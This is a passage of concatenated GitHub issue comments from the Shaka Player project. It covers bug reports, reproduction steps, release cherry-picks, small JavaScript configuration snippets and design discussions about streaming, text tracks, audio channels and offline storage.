and audio independently?\nDo you expect us to wait until a video segment is buffered before fetching the corresponding audio segment?  Or fetch them simultaneously?. I think this is feasible.  Tentatively scheduled for v2.3.. We hadn't planned to work on this right now, but it came up while working on another issue.  It seems to help that other issue, and it is fairly simple, so we will clean it up and try to get it out soon.. Fix cherry-picked to v2.3.5.. It looks like this may have been opened by mistake.  There are no changes as far as I can see.  Is there something you'd like to merge into our repo?. Closing due to inactivity.  Let us know if we can help you somehow.. This did not reoccur in the subsequent 50+ nightly runs.  I'm running a stress test now to try to reproduce.. Unable to reproduce after 20 more runs.. Confirmed on master.  Not present in v2.1.x.. Should be fixed now.  Thanks!. We should double-check this against the nightly build of the receiver.  The introduction of isAudioOnly in #942 may have addressed this for v2.2, in which case we just need a quick fix for v2.1.x.. Looks like this just needs a quick fix for v2.1.x.  The bug can't be reproduced on master.. The original fix (isAudioOnly()) was trivial to cherry-pick to v2.1.x, so I went ahead with that.\nThe ready isAudioOnly() fixes this is because the old method was checking the number of tracks with a video codec.  If the number of tracks with a video codec was 0, it was considered audio-only.  But this would also be true if the content manifest wasn't fully parsed yet (0 tracks total).  The implementation of isAudioOnly() returns false if there are no tracks at all.\nThe cherry-pick will be available in v2.1.8.. This is working on the latest Chromecast firmware, so this can be closed.. @JeffJassky, we haven't released v2.1.7 quite yet.  (I was planning it for Monday afternoon (PDT), but it looks like it may wait until Tuesday.)  Can you double-check your version number?. With the latest code from master, I get 'cuechange' events on:\n * Chrome 60 Linux\n * Firefox 54 Linux\n * Safari 9 Mac\n * Edge 15 Windows\n * IE 11 Windows\nWith the v2.1.x branch, I get the same results.\nWhen we fixed #848 (fb51fe4798ddd564badc81f8082ab9b32407db71) in v2.1.6, we introduced a bug that caused issues with text tracks on IE & Edge.  This has already been fixed in master and the v2.1.x branch, and will be released in v2.1.7 (today or tomorrow).  The issue has nothing to do with 'cuechange' directly, but what's happening with that bug is that IE & Edge rejected our cues.\nCan you try again with v2.1.x or master?. v2.1.7 is out now.  Can you try again with the appspot demo page to confirm that this is fixed?. We believe this has been fixed in v2.1.7.  Today, we released v2.1.8 and v2.2.0.  Here are links to specific versions for testing:\nHere are links to specific version subdomains:\nhttps://v2-1-7-dot-shaka-player-demo.appspot.com/\nhttps://v2-1-8-dot-shaka-player-demo.appspot.com/\nhttps://v2-2-0-dot-shaka-player-demo.appspot.com/\nClosing for now, but if you are still having issues, please let us know so we can reopen and investigate.  Thanks!. The browser API takes ArrayBuffer or Uint8Array, but the Shaka API takes Uint8Array only.  This is not really a compliance issue, because our API and the underlying browser APIs we depend on are two completely different things.\nIt's easy to reconcile, though, at the app level.  new Uint8Array(bufferSource) should do the trick.. Closing for now, but please let us know if you'd like to reopen the issue.  I would be happy to discuss further if you wish.. @chrisfillmore, we will need more detailed instructions to reproduce.  I have the demo app you sent, but it is not self-explanatory.\n\nHow do we go about loading the content and playing it?\nI'm also not sure if the demo app is complete and working, since there are many error messages in the JS console.  Most are \"Failed to load resource\" for json or js files, and the last is \"SyntaxError: Unexpected token\" while parsing JSON.. Ah, that helps.  Which config do you want me to use?\nI picked one arbitrarily and got CORS errors.  Is this expected?  Should I be using chrome --disable-web-security for this sample app?. Thanks, Chris.  I'll try to take another look tomorrow.. @chrisfillmore, does this mean the problem is resolved?  Or that it is improved, and now we are concerned about the failed assertions?\nLooking at the assertion code in SegmentIndex, it looks like we expected any segments that start after the period ends to be dropped from the manifest.  But it doesn't look like it will affect playback.. That's great news.  Thanks, Chris.\nI'm sorry we weren't able to find the time to help more with this, but I'm glad it is resolved.. No worries!  It wasn't too much to ask.  We've just been backlogged on issue triage lately and we're fighting our way back out now.. Does not seem to affect v2.1.x, but we fixed it in time for v2.2.0.  Thank you for the report!. That all looks correct to me.  I'm unable to reproduce using our appspot demo and the JS console:\nhttps://v2-1-5-dot-shaka-player-demo.appspot.com/demo/#asset=//storage.googleapis.com/shaka-demo-assets/sintel/dash.mpd;lang=en-US\nOn my connection, I have enough bandwidth for 4k.  When ABR has adapted up to 4k, I select a low-res track that shows me I'm definitely not seeing an ABR decision.\nIn the debugger, I first get a handle to a low-res track.  Then I disable ABR.  Then I select that track.\njs\nlowRes = shakaDemo.localPlayer_.getVariantTracks().filter(t => t.width == 256)[0];\nshakaDemo.localPlayer_.configure({abr: {enabled: false}});\nshakaDemo.localPlayer_.selectVariantTrack(lowRes, true /* clear buffer */);\nThis is working as expected for me.  If I re-enabled ABR, it adapts back to 4k:\njs\nshakaDemo.localPlayer_.configure({abr: {enabled: true}});. @yairans, what version of Shaka Player are you using?  Can you reproduce with the latest code from master?. The fix is in master now and will be cherry-picked to v2.2.2.. @OrenMe, I'm working on it now, and I hope to release this week.  We had a small problem that prevented us from doing a release sooner, and that was fixed yesterday in 3a91c466cfe7c3fa7b3de0677af04876c08b0397.. Reopened.  We'll try to look into it again.. We have decided to limit seeking to duration.  When a user seeks to a time >= duration (or selects a playback start time >= duration), we will seek to some fixed distance before the duration instead.\nThis seems to be the only consistent cross-browser solution, and it is consistent with behavior we have seen in other applications.. Sorry, I believe this is related to #1014, but I could be wrong.  I expect my fix for #1014 will fix this as well. \n I'll be verifying my assumptions soon, and I will report back.. [UPDATE]: Nightly repro URL fixed\nI was wrong.  The two issues are unrelated.\nI am unable to reproduce this issue on Chrome or IE with the latest nightly build:\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://qa-nginx-vod.dev.kaltura.com/dash/p/1091/sp/109100/serveFlavor/entryId/0_wifqaipd/v/2/flavorId/0_,m131krws,5407xm9j,xcrwyk2n,ep7yqavp,1xcr8gnf,kozg4x1x,njhnv6na,/forceproxy/true/name/a.mp4.urlset/manifest.mpd;lang=en-US;play\nIn both cases, I start the video, seek to around 11:30, let it play to the end (12:21), then click play again, let it start over at 0, seek to around 11:30, then let it play to the end again.  On both Chrome and IE, the video reaches the end (12:21).\nI find that on Chrome, when the video reaches the end state, the demo controls show the giant \"play\" button over the video frame.  On IE, the demo controls remain in a \"playing\" state.  To replay the video on Chrome, I click the giant play button.  To replay the video on IE, I first click the \"pause\" button, then \"play\".  This seems to be a bug in the demo controls on IE.  I will investigate this.\nIn the mean time, please confirm that the original bug (stuck at 12:20) has already been fixed.. I fixed the video controls bug and pushed an update to the nightly build on appspot.  Please take a look and confirm.  Thanks!. The fix has been cherry-picked for v2.2.8.. We'll take a look.  Thanks!. Repro Steps:\n\nOpen https://shaka-player-demo.appspot.com/demo/#asset=https://qa-nginx-vod.dev.kaltura.com/dash/p/1091/sp/109100/serveFlavor/entryId/0_wifqaipd/v/2/flavorId/0_,m131krws,5407xm9j,xcrwyk2n,ep7yqavp,1xcr8gnf,kozg4x1x,njhnv6na,/forceproxy/true/name/a.mp4.urlset/manifest.mpd;lang=en-US;build=uncompiled;play\nSeek close to the end (11:50)\nPlay to the end (12:21)\nHit the giant \"play\" button to replay\nSeek close to the end again (11:50)\nPlay to the end (12:21)\n\nAt step 4, in v2.3.2 on IE 11 specifically, the giant play arrow does not show up.  Investigation shows that the arrow only shows when the video is paused.  On IE, video.ended == true, but video.paused == false, which is not the way other browsers behave.  Normally, video.ended implies video.paused.\nAs a fix, we will have to check both video.ended and video.paused.  Note that this only affects our custom controls in the demo app, and nothing is broken in the Shaka Player library itself.. After fixing the issue in the demo controls at step 4, another issue surfaces, and the video gets stuck in a buffering state at 12:20, as in the original issue.  Not sure about the cause yet.. After the first playback ends, MediaSource on IE 11 grows the duration from 741.081 to 741.081111.  This rounding error is causing the buffering at the end of replay.. The chain of bad data goes from MediaSourceEngine.getDuration() to PresentationTimeline.setDuration() to PresentationTimeline.getDuration() to StreamingEngine.update_(), which prevents a call to MediaSourceEngine.endOfStream(), which affects the state of MediaSourceEngine.ended(), which affects PlayheadObserver's buffering state calculations.. We should be able to fix this in v2.3.3.. Cherry-picked for v2.3.3.. @ArturoCanizares, please use the issue template to provide the necessary info.  In particular, a Shaka Player version (so we can tell if the issue has already been resolved) and a manifest URI (so that we can reproduce the issue) are very important.. @ArturoCanizares, the issue template is the markdown form prefilled into the text area when you visit https://github.com/google/shaka-player/issues/new to file an issue.  You didn't fill it out at all.  Here's another copy:\nHave you read the FAQ and checked for duplicate issues:\nWhat version of Shaka Player are you using:\nCan you reproduce the issue with our latest release version:\nCan you reproduce the issue with the latest code from master:\nAre you using the demo app or your own custom app:\nIf custom app, can you reproduce the issue using our demo app:\nWhat browser and OS are you using:\nWhat are the manifest and license server URIs:\n(you can send the URIs to shaka-player-issues@google.com instead, but please use GitHub and the template for the rest)\nWhat did you do?\nWhat did you expect to happen?\nWhat actually happened?\n. @ArturoCanizares, can you provide the information we requested?  Is this still an active issue for you?. Sounds good.  Thank you!. Hi all,\nThe \"needs triage\" label means we are aware of the issue but have not reproduced it or scheduled any changes.  We will get to this as soon as we can.  We apologize for the delay.. It seems that there are two things at work here.\n\nIf the playhead falls outside the seek range, we force the playhead back in.  This is a good thing generally, but perhaps this should be suppressed while paused.  If the user pauses a live stream for so long that we fall outside the seek range, we would jump back into the seek range when the user hits play.\nWe continue to buffer while paused.  This is also generally a good thing.  Imagine you want to pause the content specifically to let it buffer.  Perhaps adaptation is turned off and the player is forced to a high resolution, or perhaps there is no stream with low enough bandwidth for you and you are a patient user.  So we don't want to stop buffering when paused.  But perhaps we should consider an exception where if paused and outside the seek range, we stop buffering.  This would be more work than point 1 above, and have less effect since buffering while paused will always stop once the buffering goal it hit.\n\nFor now, I propose that we suppress forced seeks based on the seek range while paused.  (This is in shaka.media.Playhead.)  I expect this will be enough, but if not, we can explore changes to StreamingEngine as well.\nTentatively scheduled for v2.3.. > what if there will be long DVR, for example 24 hours? It will still download for 24 hours. I propose to dome some configurable parameter, that configures x seconds timeout after which not to download new segments after x seconds of being paused.\nNo, it wouldn't download for 24 hours in that scenario.  If the buffering goal were set to 60 seconds, it would only download 60 seconds of content ahead of the playhead.  If we are paused, the playhead wouldn't move (change 1 above) and we'd stop buffering soon.\nSo in essence, the parameter you propose already exists: streaming.bufferingGoal  Does that make sense?. Thanks, Chris.  Many other things are slipping to v2.4, but this is still scheduled for v2.3.. Yes, we plan to release v2.3 in 2017.  I would like to give a more specific timeline, but it is difficult to predict when we will finish work on the critical issues that make up that milestone.  You can track progress by watching the number of open and closed issues in the milestone.. I'm sorry, there's nothing I can think of.  Forced seeks in PlayheadObserver should be suppressed while the video is paused.  If you need a fix sooner than we can provide one, you always have the option of submitting a pull request.  Sorry for the delay.. The fix has been cherry-picked to v2.2.4.. Happy to help!  Kudos to @michellezhuogg for doing the actual work.  :-). This is a caching issue.  We just updated to v2.2.0 today, but some of the v2.1.7 resources are being cached by the server.  For future releases, I will lower the cache time on appspot from 1 day to 1 hour so that this doesn't happen again.\nHere are links to specific version subdomains:\nhttps://v2-1-7-dot-shaka-player-demo.appspot.com/\nhttps://v2-1-8-dot-shaka-player-demo.appspot.com/\nhttps://v2-2-0-dot-shaka-player-demo.appspot.com/\nWill you confirm that these are all working?  If so, this problem should go away within 24 hours.  I apologize for the inconvenience.. Confirmed on v2.2.0.  Not present in v2.1.8.  This is probably a bug in our default text displayer.  The text displayer plugin interface was introduced in v2.2.0 and was not present in v2.1.x.. This fix will be available in the nightly build tomorrow.  We will also release this fix in v2.2.1.. I'm planning to wait until next week, so we can deal with incoming bug reports about v2.2.0.  You can always try the master branch in the mean time.. Cherry-picked to v2.2.1. Hi all,\nCan you please try again?  I believe this was a caching issue on our appspot instance which should now be solved.. I believe this was caused by our previous default cache policy of 24 hours on appspot.  I have updated this to 1 hour, so future appspot pushes should be quickly consistent.  Sorry for the inconvenience!. We already support TTML in MP4 (independent of any particular manifest format such as HLS or DASH).  The parser for TTML in MP4 is registered by MIME type and codec string, so we can simply add \"stpp.TTML.im1t\" to that registration:\nhttps://github.com/google/shaka-player/blob/33c38e9c7ef47abb35b7bd27e374999ab5b64b22/lib/text/mp4_ttml_parser.js#L91. This turns out to be much more complicated than I realized.  Still working on the solution.  Thanks!. Cherry-picked to v2.2.1. I haven't tried yet, but it sounds easy enough to reproduce.\nIt shouldn't be undefined, because the regex looks like this:\njs\n  if ((results = /^align:(start|middle|center|end|left|right)$/.exec(word))) {\n    VttTextParser.setTextAlign_(cue, results[1]);\nSo results[1] should only be one of those strings in the regex alternation.  Later, when we do this:\njs\n    cue.textAlign = Cue.textAlign[align.toUpperCase()];\nThe value of align should definitely be one of the enumerated values.\nWe'll dig into this.  Thanks for the report!. Okay, I thought it would be easy to repro, but I can't so far.  I have tried both \"Angel One\" (WebVTT subs) and \"Sintel\" (w/ MP4-embedded VTT text).  Can you please send a demo asset or app that reproduces the problem?. It seems that we didn't catch this because we aren't testing with text streams that use these attributes.. Cherry-picked to v2.2.1. Confirmed, even with the clear version of that asset.  Thanks!. The bug seems to be in shaka.offline.Storage, but it isn't caught in the integration tests.  The issue is in the interface between the manifest parser and Storage, and our integration tests use fake manifests.  The filtering functionality is therefore not covered in these tests.. The fix will be in the nightly build tomorrow, and in v2.2.1 after that.  Thanks!. Cherry-picked to v2.2.1. Seems reasonable.  Thanks!. @forbesjo, on further consideration, I am not so sure about this.  If you want to avoid requesting a manifest, why not just wait to call player.load()?. Did you reproduce in the demo by turning captions on and off?  Is it easier to reproduce in your own application than in the demo?. @SemihGk, is your application directly manipulating the track state instead of using Player.setTextTrackVisibility()?  Are you using custom video controls (video.controls == false) or the built-in browser controls (video.controls == true)?\nIt is possible that the browser built-in controls use \"disabled\" instead of \"hidden\".. This will be cherry-picked to v2.2.2.. We need to reproduce locally, file a bug on Apple if there isn't one yet, then work on a polyfill for Safari to fix it in JS.  Thanks for the report!. The fix will be cherry-picked to v2.2.2.. We have polyfills to work around MediaSource issues on both Safari 9 and 10, and they may need to be tweaked or updated.  We will try to reproduce, file bugs on Apple as appropriate, then find a workaround in JS.  Thanks!. Since this is docs only, I'm skipping the build bot and merging.. Cherry-picked to v2.2.1. This is a great suggestion.  Thanks!. @ismena has already written the code for this, but I'm seeing some issues with low-quality data on certain platforms.  We will wait to launch in Shaka Player until data quality issues have been resolved.\nTherefore, this may not land in v2.3.0.. There seems to be an issue with hanging GETs.  Chrome team has been made aware and are working on a fix.. They have, but I'm not certain if the fix was released in Chrome 62 or 63.  I will try to confirm.. Still seeing the issue in Chrome 62.  I expect this will be fixed in Chrome 63, but I have yet to confirm.. https://bugs.chromium.org/p/chromium/issues/detail?id=770897 shows that fixes have been made to Chrome 63, which is scheduled to go stable in December.\nWe will avoid publishing this feature until the fixes in Chrome are in the hands of the masses.. Running tests on the build bot now.. Cherry-picked to v2.2.1. I'm glad you figured it out, but it should be more obvious.  For example, we could automatically select the offline copy in the list after storing it.  I'm going to reopen this and schedule it for v2.3, but a demo app usability improvement like this could also be cherry-picked to v2.2.x releases.. The fix has been cherry-picked to v2.2.x and will be released in v2.2.2.. @chrisfillmore, no, it will be much the same.  The difference is that desktop Safari has MediaSource, so desktop Safari will be able to play HLS through either mechanism.\n@avelad, hopefully this simplifies FairPlay for both iOS and desktop Safari.. @chrisfillmore, thank you for your feedback.  I will try to solicit broader feedback from the community before proceeding.. @chrisfillmore, I appreciate your feedback and I acknowledge your dissenting opinion on this.  I wanted to tie up one loose end now that we've started work:\n\nIf support for src= increases complexity in Shaka to the extent that it makes it more difficult to develop solutions for streaming, then IMO it seems like more of a burden than a help. I would argue that client applications should not have a hard dependency on Shaka -- whatever abstraction sits between the client and Shaka should allow the app to play via src=.\n\nWhat we've found so far is that the work we've started to implement src= support is actually cleaning up a lot of the most complex and difficult to maintain parts of the Player class.  So rather than increasing the complexity of Shaka Player, I believe this work is significantly improving Shaka Player in the long run.  It's a lot of work, but it seems worthwhile.\nApps are, of course, still free to use src= for themselves, and will never be required to depend on Shaka more than they want to.. Looking at the spec again, I don't see any benefit to our demo.  It seems to require that we preload specific resources, which are all already included in the <head> element.. We are not working on it yet, primarily because we aren't yet sure how best to do the refactoring.. Yes.  With this change, only SegmentTemplate+duration would need to use availabilityStartTime, device time, or clock sync.. Hi everyone,\nI had plans to solve this as part of a larger refactor, which is described in #1339.  I now think this should be solved in a simpler way, by just modifying the DASH parser.  I still plan to refactor things in #1339, but there's no reason this issue needs to be dependent on that.. I found a bug in the implementation which needs to be corrected, so I'm reopening this issue.\n@avelad, I won't include this in v2.4.4 because it's a major behavior change and comes with some amount of risk.  I think the fact that I didn't get it right the first time supports this decision.  :-)\nI am planning to release a couple of betas for v2.5, though.  If you're willing to try out a beta, you can have this feature before v2.5.0 is final.. Oh, and I forgot to explain the bug I found: it only works for single-period content where the period starts at 0.  The timestamps I'm using to compute the live edge are relative to the period, but they should have been relative to the presentation.. 1000 issues!  I can hardly believe it.\nThank you to all of our contributors, to our users, to everyone who ever filed an issue against us over the years, and to the browser vendors who have responded so kindly to the issues we filed in turn.  Shaka Player exists thanks to all of you.\nHere's to 1000 more!  :beers:. Thanks!. Thanks!  Doing a test pass on the build bot now.. There are a couple of build failures about children vs childElements  (children attribute is not present on all platforms we support).\nI also did some manual testing of your change locally, and it's not working correctly for me.  After storing something, the store button goes gray and the help text says The asset is stored offline. Checkout the \"Offline\" section in the \"Asset\" list.  The URI hash has changed to asset=offline:0, but the original asset is still selected in the drop-down list itself.  Perhaps you're missing some call to update the list to match?. Sorry, not childElements.  I meant to say childNodes.. And now it's working for me locally.  Maybe I had something cached.  Sorry for the noise.. Looks good.  Running tests now.  Thanks!. Merged.  Thanks for your contribution!. I am planning to cherry-pick this to v2.2.2.. This has been cherry-picked and will be released in v2.2.2.. Perhaps.  I hadn't planned anything of the sort, but we will mull it over.. You can completely destroy as @TheModMaker points out, or you can detach from the video element and attach to a new one:\njs\nplayer.detach().then(function() {\n  // The old video element is no longer referenced by the player,\n  // and MediaSource has been torn down.\n  return player.attach(newVideo);\n});\nOr in modern browsers:\njs\nawait player.detach();\n// The old video element is no longer referenced by the player,\n// and MediaSource has been torn down.\nawait player.attach(newVideo);\n// The player is fully ready for playback,\n// and MediaSource has been set up on the new element.. Not at the moment, but we could build this out into a proper plugin interface.. Glad I could help!. Cherry-picked to v2.2.3.. I'm cherry-picking the fix to v2.2.3.  This issue is still open until we land appropriate regression tests to go along with the fix.. Regression test cherry-picked for v2.2.5.. @TheJohnBowers, the status is that @TheModMaker requested changes to this PR from @forbesjo, and we are still waiting on an updated PR.  Adding ms:laurl support is a low priority item for the Shaka Player team at this time, but we are always happy to have features contributed by the community.. Closing in favor of #1644, which is being actively worked on.  Thanks!. Shaka plays HLS (and everything at the moment) through MSE, which means only fMP4 would work on Chrome.  Playing through MSE also means Android's built-in HLS playback isn't part of the equation.\nWe'll look into it, though.  Thanks!. This is a little more nuanced than \"bad content\", and ultimately, we will have to make some changes.\nApple's own tools create content starting at t=10, with no option to change that, which seems crazy and broken.\nhls.js can play this content.  We would like our users not to need multiple player solutions to cover DASH & HLS, so we should be able to handle this.\nCurrently, we have an option in Player to compensate for this in VOD content: manifest.hls.defaultTimeOffset.  If you know your content starts at something other than 0, use this configuration to tell us so we can offset it back to 0.  So you can solve this already with current versions of Shaka Player and a little bit of configuration.\nAs we have been working on HLS live, though, we find that things get more complicated.  A media playlist will give the URLs of available segments and the durations of those segments, but not their start time.  Although there is a maximum segment duration in the playlist, older segments which have already disappeared may have had smaller durations than the maximum.  So there is no way to know (accurately) the start time of the first available segment in a live manifest.\nThis means that for live, we will have to fetch the first available segment, parse it to find the start time, then use that to derive the start times for the rest of the segments and build our segment index.  Once we are doing that, the need for an application to inform us of VOD start time goes away, and we will deprecate manifest.hls.defaultTimeOffset.. I'm removing the \"bad content\" label, even though it pains me, and marking this as \"HLS\" and \"enhancement\".  In the meant time, you can work around it through configuration.. I have a CL in review that parses content to get the start time, rather than relying on configuration.  But for content that doesn't start at 0, a gap-jumping configuration is still required.  If I go one step further and offset VOD content back to 0, apps won't have to be specially-configured for HLS.. The fix will be cherry-picked to v2.2.2.. Sorry, I missed this.  Let me take a look.. I'd like to offer one refinement to your proposal:\n\n\nChoose the codec that has a track with the number of channels closest to the preference (preferredAudioNumChannelLanguage).\n\n\nI'd like to change this to:\n\nChoose the codec with the largest number of audio channels less than or equal to the configured number of output channels.  If this is not possible, choose the smallest number of channels.\n\nFor a 6-channel system, we should use 6-channel audio tracks if possible.  For a 2-channel system, we should never use 6-channel audio unless there's nothing else.\nFurther, the default for configured output channels should be 2.  If applications do not explicitly tell us that there are more output channels, we should assume 2-channel output capabilities.\nSome day, if the Media Capabilities API can give us a hint about the actual output capabilities of the device, this could be used as the default configuration instead of \"2\".\nHow does that sound?\nSince v2.3 is getting heavy, I'm going to put this in the backlog for now.  I expect we'll start planning v2.4 soon, though, and this seems like a good candidate for v2.4.. Done.. Thanks for letting us know.  We'll take another look.. @avelad, the fact that these are all using different codecs is confusing this issue.  MediaSource doesn't support changing codecs during playback (yet).  So we have to pick one codec at the beginning and stick with it.  This means regardless of how we make audio channel decisions, this particular clip will never have more than one channel configuration to choose from during playback.  Once playback begins, we're locked into a codec.\nI will try to produce a sample of our own that will work better for testing this feature, where all channel counts are available in the same set of audio codecs.. I found a copy of the free movie \"Tears of Steel\" in surround sound: http://ftp.nluug.nl/pub/graphics/blender/demo/movies/ToS/\nI will package and publish this.. For content where codec choice does not restrict choice of channel count, there are some issues with the fix we already made:\n\nThe channel preference is not correctly used for the initial content selection if the config was changed between construction and load().\nThe AbrManager's options are not updated if the user manually chooses a track with a different number of channels.  When Abr is re-enabled, the channel count reverts to its configured setting.. Third issue: if tracks change due to a key status change, the current channel count and config get ignored, and AbrManager gets to choose from all tracks.\n\nI should have fixes out for all of these issues soon.. Sure, no problem.. We can't choose between 6-channel AC-3 and 2-channel AAC at runtime because MediaSource does not yet support switching codecs during playback.  This is something browser vendors are working on, but for now, the player must choose a single codec when we load the manifest.\nBut you are right that we should account for the preference when making the initial codec choice.  I will reopen and investigate.  Thank you for bringing this to our attention!. Understood.  Today, the user can choose between 2 and 6 channels if the codec is the same.  If the codec differs, we should take the channel preference into account when choosing codecs.  In the future, when MediaSource supports codec switching, the user will be able to choose between 2 and 6 channels during playback even if the codec differs.. @avelad, we believe we found the error you are referring to in the demo app and fixed it.  Please let us know if this is working for you.. Glad to hear it!  Thank you for being patient with us while we got this right.. If anybody knew, it would be me... :-)\nWe're working to wrap up v2.4, but we are blocked on #1248, to restore backward compatibility for our offline storage system.  We hope to be done with that by the end of the month.. This fix will be out in v2.4 this week.  Thanks for your patience!. We have decided to limit seeking to duration. When a user seeks to a time >= duration (or selects a playback start time >= duration), we will seek to some fixed distance before the duration instead.\nThis seems to be the only consistent cross-browser solution, and it is consistent with behavior we have seen in other applications.. It will be accurate as long as the seek position is strictly less than duration.  If the seek position is equal to or greater than duration, we will bump it back by one second.  This will only affect VOD content, and the amount we bump it back will be configurable.\nYou can also do this in your video controls as a workaround.. Fix cherry-picked for v2.2.8.. It's not representative of YouTube-encoded content, it's old, and it's unmaintained.  I move we drop it.. The fix has been cherry-picked to v2.2.x and will be released in v2.2.2.. Sounds good.  Tentatively scheduled for v2.3, but could easily slip as it is low priority compared to other features.. The new docs have been cherry-picked to v2.2.x and will be released in v2.2.2.. Note that for PWAs specifically, you should probably not be using your service worker to store the content, and you should definitely not be using your service worker to try to store the license.  Licenses don't work that way, and caching a license response in a service worker is essentially a replay attack on the CDM.. The fix has been cherry-picked to v2.2.x and will be released in v2.2.2.. It seems that if IE & Edge crash on the uuid box, the best thing to do would be to file a bug on Microsoft about that, even if you ultimately end up with a workaround in JavaScript.  Browser vendors can't improve things if we don't file bugs with them, so I suggest that you start there.\nWhen you have filed a bug with them, please link to it here so that we can subscribe and track it.  Thanks!. Also, I agree with @TheModMaker about putting this into a response filter.  This is what response filters were designed for.. The first part of the fix has been cherry-picked to v2.2.x and will be released in v2.2.2.  A deeper refactor is coming, which will land in v2.3.0 due to small API changes.. @mateon01, you did not provide any way for us to reproduce the problem.  Please provide the following information, which was requested in the issue template:\n=====\nWhat version of Shaka Player are you using:\nCan you reproduce the issue with our latest release version:\nCan you reproduce the issue with the latest code from master:\nAre you using the demo app or your own custom app:\nIf custom app, can you reproduce the issue using our demo app:\nWhat browser and OS are you using:\nWhat are the manifest and license server URIs:\n(you can send the URIs to shaka-player-issues@google.com instead, but please use GitHub and the template for the rest)\nWhat did you do?\nWhat did you expect to happen?\nWhat actually happened?. Thanks!  We will try to reproduce using our demo app.  If this is specific to the Chrome PWA sample, we may not be able to offer direct support for that.  If we can reproduce with our demo, we should be able to help you.. To clarify, caching a license response in your service worker is the same as a replay attack against the CDM.  The CDM defends itself against this and will reject such a cached response.\nShaka Player's offline APIs take care of media storage and persistent licensing for you, so these are what you should use instead.  Service workers should not be used to cache media or licenses.. Note that this has also been filed internally as b/65674425.. Error 3014 would indicate a decoder or demuxer error in the browser.  It's mostly out of our hands, and usually indicates a problem with the encoder.  With these sorts of issues, it's best to use chrome://media-internals in Chrome to see logs from the media stack.\nIn cases where the logs indicate an issue, but it's not obvious what the encoder would have done wrong, we usually end up having to analyze the media itself and/or forward the issue to the Chrome media team for deeper diagnosis.\nWe will post media-internals results soon.. Timestamp | Property | Value\n-- | -- | --\n00:00:00 00 | origin_url | (omitted)\n00:00:00 00 | frame_url | (omitted)\n00:00:00 00 | frame_title | DIRECTV NOW\n00:00:00 00 | url | blob:(omitted)\n00:00:00 00 | pipeline_state | kStarting\n00:00:01 275 | has_cdm | true\n00:00:01 490 | found_video_stream | true\n00:00:01 490 | video_codec_name | h264\n00:00:01 611 | found_audio_stream | true\n00:00:01 611 | audio_codec_name | aac\n00:00:01 613 | seek_target | 1\n00:00:01 624 | debug | DecryptingAudioDecoder: failed to init decoder on decryptor\n00:00:01 625 | audio_dds | true\n00:00:01 625 | audio_decoder | FFmpegAudioDecoder\n00:00:01 625 | debug | Video rendering in low delay mode.\n00:00:01 649 | video_dds | false\n00:00:01 649 | video_decoder | DecryptingVideoDecoder\n00:00:01 649 | pipeline_state | kPlaying\n00:00:01 649 | pipeline_state | kSeeking\n00:00:01 278 | duration | 4294967296\n00:00:02 44 | pipeline_state | kPlaying\n00:00:02 88 | audio_buffering_state | BUFFERING_HAVE_ENOUGH\n00:00:04 491 | error | Failed to prepare video sample for decode\n00:00:04 491 | error | Append: stream parsing failed. Data size=131072 append_window_start=0 append_window_end=inf\n00:00:04 492 | pipeline_error | CHUNK_DEMUXER_ERROR_APPEND_FAILED\n00:00:04 492 | pipeline_state | kStopping\n00:00:04 492 | pipeline_state | kStopped\n00:00:04 517 | event | WEBMEDIAPLAYER_DESTROYED. As explained by @TheModMaker, bufferingGoal is for buffering ahead, and may not be achievable for a live stream played at the edge.  rebufferingGoal is for startup and rebuffering, as is minBufferTime in the manifest.  If minBufferTime is larger than rebufferingGoal, it will override rebufferingGoal.\n@taryodor, does this answer your question?. Glad we could help!. The fix has been cherry-picked to v2.2.x and will be released in v2.2.2.. @peterdotjs, it sounds like what you need is the ability to pass in the MPD text, which you have already fetched.  Network filters and/or scheme plugins are a reasonable approach for that.  Another approach could be the Service Worker API and Cache API, but Shaka's plugins will work on all browsers.\n@chrisfillmore, it sounds like what you need is a hook or event to examine content metadata between manifest parsing and the start of streaming.  I believe this should be a separate feature request.. Filed #1043 to address the scenario mentioned by @chrisfillmore.  Closing this issue.  Thanks!. You could have a look at extending our closure extern generator to also generate typescript files as well.  You'll find this in the build folder.\nWe don't have time to work on this right now, but we would welcome a contribution if you would like to work on this sooner than we can.  For now, I'm adding this to the backlog.. We don't have any experience with clutz, so it's hard to say.  This is currently on our backlog, so we are not working on it right now.. Yes, an automated solution would be much preferred.  Humans are generally lazy (like me!) so hand-written typings are likely to get out of sync quickly as the API expands and evolves.\nWe already have automation for the Closure-equivalent.  Please see build/generateExterns.js.  If you could extend this to generate typescript typings, or if you could generate typescript typings from the output of this tool (dist/shaka-player.compiled.externs.js), that would be ideal.\nOur existing tool for Closure externs is written entirely in nodejs, and uses esprima to parse JavaScript and generate output based on the abstract syntax tree.\nAre you interested in contributing to typescript automation?. Thanks!. Awesome!. @kuznetcoff777, if the encoder stops updating the live manifest, we have no way to detect that right now.  I would like to be able to detect this situation and issue an error, but I'm not sure how best to do that.\nIf there is any guidance in DASH or DASH IOP, I would be grateful for pointers.. It seems that publishTime might be part of the solution, but a quick scan of the latest IOP did not turn up an obvious solution.\n\nMPD@publishTime provides versioning functionality: MPD with later publication times include all information that was included all MPDs with earlier publication times.\n\nPerhaps if publishTime isn't changing for a significant amount of time, we could combine that with some other signal to guess that the encoder is offline.. @kuznetcoff777, you are welcome to submit a pull request for this if you need a solution sooner than we can provide.\nThe best idea we have come up with in this thread so far is to fail when publishTime stops updating for some amount of time.  You would need to look into lib/dash/dash_parser.js to add the check and lib/util/error.js to create a new error code.  If you want the timeout to be configurable, you would also need to look at externs/shaka/player.js to add a field to shakaExtern.DashManifestConfiguration and lib/player.js to set the default.. Yes, I think some configurable parameter makes sense.. This is a thing we could do, but I'm not prepared to make such a fundamental shift in our philosophy/architecture right now.  I'm tentatively adding this to the backlog, but I'm not certain if we will do this.  We need time to think through the ramifications.\nIn the mean time, have you considered waiting to install polyfills until right before you set up Shaka Player?  You could do your platform detection first, then choose a player, then install polyfills if it's Shaka, then instantiate a shaka.Player instance.  Would this help?\nAnother option would be to install polyfills individually instead of using shaka.polyfill.installAll().  You can call each one when you wish, such as:\n```js\nshaka.polyfill.Fullscreen.install();\nshaka.polyfill.IndexedDB.install();\nshaka.polyfill.InputEvent.install();\nshaka.polyfill.MathRound.install();\n// ... wait ...\nif (timeToChooseAPlayer) {\n  shaka.polyfill.Promise.install();\n  shaka.polyfill.MediaSource.install();\n  shaka.polyfill.MediaKeys.install();\nif (shaka.Player.isBrowserSupported()) {\n    var player = new shaka.Player();\n  } else {\n    // ...\n  }\n}\n```\nDo these suggestions help?. DASH manifests are 